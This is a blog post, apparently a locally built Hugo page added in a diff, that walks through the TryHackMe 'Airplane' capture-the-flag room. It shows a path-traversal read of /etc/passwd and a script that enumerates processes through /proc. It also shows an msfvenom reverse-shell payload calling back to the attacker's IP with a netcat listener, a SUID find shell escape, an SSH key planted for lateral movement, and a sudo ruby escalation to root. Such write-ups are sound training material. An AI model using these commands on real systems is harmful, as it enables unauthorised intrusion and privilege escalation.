@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
+    <title>Airplane THM Walkthrough - Peter Wambua&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    <meta name="description"
+  content="A walkthrough of a medium room in TryHackMe. A great room needing critical thinking to exploit path traversal attacks to scripting to manipulate a gdbserver process to a tricky privilege escalation by ruby." />
+<meta name="keywords"
+  content='' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://localhost:1313/post/airplane-thm-walkthrough/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Airplane THM Walkthrough - Peter Wambua&#39;s blog" />
+<meta name="twitter:description"
+  content="A walkthrough of a medium room in TryHackMe. A great room needing critical thinking to exploit path traversal attacks to scripting to manipulate a gdbserver process to a tricky privilege escalation by ruby." />
+<meta name="twitter:site" content="http://localhost:1313/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="http://localhost:1313/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Airplane THM Walkthrough - Peter Wambua&#39;s blog">
+<meta property="og:description"
+  content="A walkthrough of a medium room in TryHackMe. A great room needing critical thinking to exploit path traversal attacks to scripting to manipulate a gdbserver process to a tricky privilege escalation by ruby." />
+<meta property="og:url" content="http://localhost:1313/post/airplane-thm-walkthrough/" />
+<meta property="og:site_name" content="Airplane THM Walkthrough" />
+<meta property="og:image"
+  content="http://localhost:1313/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2024-06-17 07:17:09 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="http://localhost:1313/">
+        <img class="octicon" height="32" width="32" src="">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <img height="24" class="octicon octicon-three-bars" width="24" src="">
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+              <input type="hidden" name="q" value="site:http://localhost:1313/">
+            </label>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="http://localhost:1313/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  
+<div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
+                  <img class=" avatar-user"
+                    src="/images/profile.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="http://localhost:1313/"></a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="http://localhost:1313/post/airplane-thm-walkthrough/">Airplane THM Walkthrough</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 17 Jun 2024 07:17:09 -0400"
+                    class="no-wrap">
+                    Mon, 17 Jun 2024 07:17:09 -0400</relative-time>
+
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      656 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h1 id="airplane-tryhackme-walkthrough">Airplane TryHackMe Walkthrough</h1>
+<p><img src="/images/airplane/airplane.png" alt="">
+Such a fun challenge tbh. First add your <em>ip</em> to <em>/etc/hosts</em></p>
+<p>After booting out machine, the first thing is to perform enumeration. I first scanned with nmap and got some interesting results:
+<img src="/images/airplane/airplanescan.png" alt="">
+Port 22 -&gt; Just ssh. We wouldn&rsquo;t get to this first
+Port 6048 -&gt; NOTHING running! This left me confused
+Port 8000 -&gt; http running. Interesting! I navigated to the website</p>
+<p><img src="/images/airplane/airplaneport8000.png" alt="">
+Just an html site. I viewed page source if any hints, none. Checked if <em>robots.txt</em> exist, it doesn&rsquo;t.<br>
+The next thing I always do is run directoty scanners to find interesting pages, but none
+<img src="/images/airplane/airplanedirsearch.png" alt=""><br>
+Dirb gave nothing too :( <br>
+After been stuck for sometime, I looked at the url and suspected it could be vulnerable to path traversal due to its structure /?page=<br>
+I tried the obvious attack payload ../../../../../etc/passwd and lol
+<img src="/images/airplane/airplanepasswdfile.png" alt=""></p>
+<p>Going through the passwd file, we find 2 users, carlos and hudson</p>
+<p>Now here is where I got stuck the most. After a day, or so, I started thinking about the port open that had nothing. After some research, I found that there was I way I could check the processes running on the machine. I used GPT to assist me write a script to extract these processes.(Yes, AI will make you a good security analyst if you know how to use it well). The script:</p>
+<pre tabindex="0"><code>import requests
+
+# Base URL of the target vulnerable to path traversal
+base_url = &#39;http://airplane.thm:8000/?page=&#39;
+
+# Function to check and save process names
+def check_processes():
+    with open(&#39;process.txt&#39;, &#39;w&#39;) as file:
+        for pid in range(1, 1001):
+            url = f&#39;{base_url}../../../../../../../../proc/{pid}/comm&#39;
+            response = requests.get(url)
+            if response.status_code == 200 and response.text.strip() != &#34;Page not found&#34; and response.text.strip():
+                file.write(f&#39;PID {pid}: {response.text.strip()}\n&#39;)
+
+# Run the function
+check_processes()
+</code></pre><p>So the processes are output in the file process.txt. Going through them, I find one interesting one, airplane</p>
+<p><img src="/images/airplane/airplaneairplaneprocess.png" alt="">
+Figured it must be the one running on port 6048, and it is a gdbserver process.</p>
+<p>Searching on searchsploit, found an exploit
+<img src="/images/airplane/airplanesearchsploit.png" alt=""></p>
+<p>For the exploit, you need a reverse shell code, which we can generate by msfvenom</p>
+<blockquote>
+<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.4.84.61 LPORT=1234 PrependFork=true -o shell.bin</p>
+</blockquote>
+<p>Replace your ip. Open another terminal window and listen on an empty port with netcat</p>
+<blockquote>
+<p>nc -nvlp 1234</p>
+</blockquote>
+<p>Now run the python script
+<img src="/images/airplane/airplanesendpayload.png" alt=""></p>
+<p>A reverse shell is created, for the user hudson
+<img src="/images/airplane/airplanereverseshell.png" alt=""></p>
+<p>Stabilize the shell by:</p>
+<blockquote>
+<p>python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
+</blockquote>
+<p>I checked /home/hudson, but nothing. It means we need to do lateral escalation to go to user carlos. Now I tried maybe checking <em>sudo -l</em> but it asks for password. Tried multiple stuff but settled on checking SUID
+<img src="/images/airplane/airplanesuid.png" alt=""></p>
+<p>I was interested by the SUID find, so it checked on my goto to privilege escalation tool, <a href="https://gtfobins.github.io/">GTFOBins</a>
+<img src="/images/airplane/airplanefindgtfobins.png" alt=""></p>
+<p>Exploit by the command</p>
+<blockquote>
+<p>./find . -exec /bin/sh -p ; -quit</p>
+</blockquote>
+<p><img src="/images/airplane/airplanesuidexploit.png" alt=""></p>
+<p>We get euid of carlos while on user hudson. cat /home/carlos/user.txt for first flag</p>
+<p>Now we need to do <strong>Privilege Escalation to become Root</strong></p>
+<p>But nothing much we can do from hudson. But since we can now create files on /home/carlos, we can create an ssh key file and use it to login as carlos.<br>
+On your machine, generate ssh keys by:</p>
+<blockquote>
+<p>ssh-keygen</p>
+</blockquote>
+<p><img src="/images/airplane/airplanessh-keygen.png" alt=""></p>
+<p>Now copy your keygen.pub to /home/carlos/.ssh/authorized_keys
+<img src="/images/airplane/airplaneauthorizedkeys.png" alt=""></p>
+<p>Perfect, now head on to ssh via the other private key</p>
+<blockquote>
+<p>ssh -i airplane_rsa <a href="mailto:carlos@10.10.238.182">carlos@10.10.238.182</a></p>
+</blockquote>
+<p><img src="/images/airplane/airplanesshlogin.png" alt=""></p>
+<p>Niceeee!! We in as Carlos. Trying <em>sudo -l</em>, carlos can exploit some commands, ruby, as root without root password:
+<img src="/images/airplane/airplanesudo-l.png" alt=""></p>
+<p>I head to GTFOBins, and get this command to exploit ruby as root</p>
+<blockquote>
+<p>sudo ruby -e &rsquo;exec &ldquo;/bin/sh&rdquo;'</p>
+</blockquote>
+<p>The problem is it will require carlos password, which we don&rsquo;t have. Damn! I remembered though you can run a file from another directory by going back using ../ the proceeding to what you need to run. So, we can run the file ruby from the directory /root. First, put the escalation command in a directory like /tmp</p>
+<blockquote>
+<p>echo &rsquo;exec &ldquo;/bin/sh&rdquo;&rsquo; &gt; /tmp/sudo.rb</p>
+</blockquote>
+<p>Now we can execute it from root:</p>
+<blockquote>
+<p>sudo /usr/bin/ruby /root/../tmp/sudo.rb</p>
+</blockquote>
+<p><img src="/images/airplane/airplanesudoescalation.png" alt=""></p>
+<p>There! We get root privileges!! FUN!!</p>
+</article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
+<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />
+
+
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Contact me on <a href='https://www.linkedin.com/in/peter-wambua/'>LinkedIn</a></li>
+      
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+</body>
+
+<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>
+
+
+
+
+</html>
